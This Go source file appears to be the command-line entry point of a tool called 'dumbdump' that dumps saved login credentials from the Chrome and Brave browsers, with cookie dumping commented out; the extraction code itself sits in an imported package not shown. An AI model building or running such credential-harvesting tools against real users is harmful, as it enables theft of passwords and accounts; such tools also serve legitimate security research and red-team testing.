package main

import (
	"flag"
	"fmt"
	"maps"
	"slices"
	"strings"

	"github.com/antoninoLorenzo/dumbdump/internals"
	_ "github.com/mattn/go-sqlite3"
)

type Runner func()

var Runners = map[string]Runner{
	"chrome": runChrome,
	"brave":  runBrave,
}

func Run(targets []string) {
	for _, t := range targets {
		if runner, ok := Runners[t]; ok {
			runner()
		} else {
			fmt.Printf("[!] Invalid target %s", t)
		}
	}
}

func runChrome() {
	chrome, err := internals.NewChrome()
	if err != nil {
		panic(err)
	}

	_, err = chrome.DumpCredentials()
	if err != nil {
		fmt.Printf("[!] %s\n", err)
	}
	/*
		_, err = chrome.DumpCookies()
		if err != nil {
			panic(err)
		}
	*/
}

func runBrave() {
	brave, err := internals.NewBrave()
	if err != nil {
		panic(err)
	}

	_, err = brave.DumpCredentials()
	if err != nil {
		fmt.Printf("[!] %s\n", err)
	}
}

func main() {
	targetPtr := flag.String(
		"target",
		"all",
		`Specify target browsers, otherwise "br1,br2,..."
		`,
	)
	flag.Parse()

	targets := make([]string, 0)
	if *targetPtr == "all" {
		targets = slices.Sorted(maps.Keys(Runners))
	} else {
		targets = strings.Split(*targetPtr, ",")
	}

	Run(targets)
}
